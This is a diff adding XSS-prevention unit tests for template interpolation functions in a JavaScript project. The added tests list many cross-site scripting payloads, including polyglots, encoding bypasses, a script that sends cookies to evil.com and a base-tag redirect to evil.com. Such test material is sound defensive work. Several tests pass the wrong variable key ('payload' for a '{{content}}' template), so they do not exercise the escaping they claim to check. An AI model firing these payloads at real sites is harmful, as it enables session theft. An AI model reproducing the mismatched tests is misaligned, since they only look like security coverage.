@@ -447,6 +447,218 @@ describe('XSS Prevention', () => {
       expect(result).not.toContain('onload');
     }
   });
+
+  it('should prevent XSS via case variations', () => {
+    const template = '{{payload}}';
+    const caseVariations = [
+      '<SCRIPT>alert(1)</SCRIPT>',
+      '<ScRiPt>alert(1)</ScRiPt>',
+      '<sCrIpT>alert(1)</sCrIpT>',
+      '<IMG SRC="x" ONERROR="alert(1)">',
+      '<SVG ONLOAD="alert(1)">',
+    ];
+
+    for (const payload of caseVariations) {
+      const result = interpolate(template, { payload });
+      expect(result).toContain('&lt;');
+      expect(result).toContain('&gt;');
+      expect(result.toLowerCase()).not.toContain('<script');
+      expect(result.toLowerCase()).not.toContain('<img');
+      expect(result.toLowerCase()).not.toContain('<svg');
+    }
+  });
+
+  it('should prevent XSS via iframe injection', () => {
+    const template = '{{content}}';
+    const payloads = [
+      '<iframe src="javascript:alert(1)">',
+      '<iframe src="data:text/html,<script>alert(1)</script>">',
+      '<iframe srcdoc="<script>alert(1)</script>">',
+    ];
+
+    for (const payload of payloads) {
+      const result = interpolate(template, { payload });
+      expect(result).not.toContain('<iframe');
+      expect(result).toContain('&lt;iframe');
+    }
+  });
+
+  it('should prevent XSS via style/CSS injection', () => {
+    const template = '{{content}}';
+    const payloads = [
+      '<style>body{background:url("javascript:alert(1)")}</style>',
+      '<div style="background:url(javascript:alert(1))">',
+      '<div style="width:expression(alert(1))">',
+    ];
+
+    for (const payload of payloads) {
+      const result = interpolate(template, { payload });
+      expect(result).not.toContain('<style');
+      expect(result).not.toContain('<div');
+      expect(result).toContain('&lt;');
+    }
+  });
+
+  it('should prevent XSS via form/input injection', () => {
+    const template = '{{content}}';
+    const payloads = [
+      '<form action="javascript:alert(1)"><input type="submit">',
+      '<input onfocus="alert(1)" autofocus>',
+      '<button onclick="alert(1)">click</button>',
+    ];
+
+    for (const payload of payloads) {
+      const result = interpolate(template, { payload });
+      expect(result).not.toContain('<form');
+      expect(result).not.toContain('<input');
+      expect(result).not.toContain('<button');
+      expect(result).toContain('&lt;');
+    }
+  });
+
+  it('should prevent XSS via meta refresh', () => {
+    const template = '{{content}}';
+    const payload = '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">';
+    const result = interpolate(template, { content: payload });
+
+    expect(result).not.toContain('<meta');
+    expect(result).toContain('&lt;meta');
+  });
+
+  it('should prevent XSS via object/embed tags', () => {
+    const template = '{{content}}';
+    const payloads = [
+      '<object data="javascript:alert(1)">',
+      '<embed src="javascript:alert(1)">',
+      '<object data="data:text/html,<script>alert(1)</script>">',
+    ];
+
+    for (const payload of payloads) {
+      const result = interpolate(template, { payload });
+      expect(result).not.toContain('<object');
+      expect(result).not.toContain('<embed');
+      expect(result).toContain('&lt;');
+    }
+  });
+
+  it('should prevent XSS via base tag hijacking', () => {
+    const template = '{{content}}';
+    const payload = '<base href="https://evil.com/">';
+    const result = interpolate(template, { content: payload });
+
+    expect(result).not.toContain('<base');
+    expect(result).toContain('&lt;base');
+  });
+
+  it('should prevent XSS via body onload', () => {
+    const template = '{{content}}';
+    const payloads = [
+      '<body onload="alert(1)">',
+      '<body onpageshow="alert(1)">',
+      '<body onfocus="alert(1)">',
+    ];
+
+    for (const payload of payloads) {
+      const result = interpolate(template, { payload });
+      expect(result).not.toContain('<body');
+      expect(result).toContain('&lt;body');
+    }
+  });
+
+  it('should prevent XSS via marquee/details tags', () => {
+    const template = '{{content}}';
+    const payloads = [
+      '<marquee onstart="alert(1)">',
+      '<details open ontoggle="alert(1)">',
+      '<video><source onerror="alert(1)">',
+    ];
+
+    for (const payload of payloads) {
+      const result = interpolate(template, { payload });
+      expect(result).toContain('&lt;');
+      expect(result).not.toContain('onstart=');
+      expect(result).not.toContain('ontoggle=');
+      expect(result).not.toContain('onerror=');
+    }
+  });
+
+  it('should prevent XSS via polyglot payloads', () => {
+    const template = '{{payload}}';
+    const polyglots = [
+      'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
+      '\'"--></style></script><script>alert(1)</script>',
+      '"><img src=x onerror=alert(1)//>',
+    ];
+
+    for (const payload of polyglots) {
+      const result = interpolate(template, { payload });
+      // Verify all angle brackets are escaped
+      expect(result).not.toMatch(/<[a-zA-Z]/);
+      expect(result).not.toContain('onerror=');
+      expect(result).not.toContain('onclick=');
+      expect(result).not.toContain('onload=');
+    }
+  });
+
+  it('should escape all HTML entity bypass attempts', () => {
+    const template = '{{content}}';
+    const bypasses = [
+      '&lt;script&gt;alert(1)&lt;/script&gt;', // Already escaped - should double-escape the &
+      '&#60;script&#62;alert(1)&#60;/script&#62;', // Numeric entities
+      '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;', // Hex entities
+    ];
+
+    for (const payload of bypasses) {
+      const result = interpolate(template, { content: payload });
+      // The & should be escaped to &amp;
+      expect(result).toContain('&amp;');
+    }
+  });
+
+  it('should handle XSS attempts in interpolateWithValidation', () => {
+    const template = '{{name}} - {{comment}}';
+    const variables = [
+      { name: 'name', required: true },
+      { name: 'comment', required: true },
+    ];
+
+    const result = interpolateWithValidation(template, {
+      name: '<script>steal()</script>',
+      comment: '<img onerror=alert(1) src=x>',
+    }, variables);
+
+    expect(result.content).not.toContain('<script');
+    expect(result.content).not.toContain('<img');
+    expect(result.content).not.toContain('onerror');
+    expect(result.content).toContain('&lt;script&gt;');
+    expect(result.content).toContain('&lt;img');
+    expect(result.hasWarnings).toBe(false);
+  });
+
+  it('should handle XSS attempts in previewTemplate', () => {
+    const template = 'Preview: {{content}}';
+    const result = previewTemplate(template, {
+      content: '<script>document.location="http://evil.com?"+document.cookie</script>',
+    });
+
+    expect(result).not.toContain('<script');
+    expect(result).toContain('&lt;script&gt;');
+  });
+
+  it('should escape null bytes and control characters', () => {
+    const template = '{{content}}';
+    const payloads = [
+      '<scr\x00ipt>alert(1)</script>', // Null byte
+      '<script\x0d\x0a>alert(1)</script>', // CRLF
+      '<script\t>alert(1)</script>', // Tab
+    ];
+
+    for (const payload of payloads) {
+      const result = interpolate(template, { content: payload });
+      expect(result).not.toMatch(/<script/i);
+      expect(result).toContain('&lt;');
+    }
+  });
 });
 
 describe('Edge Cases', () => {
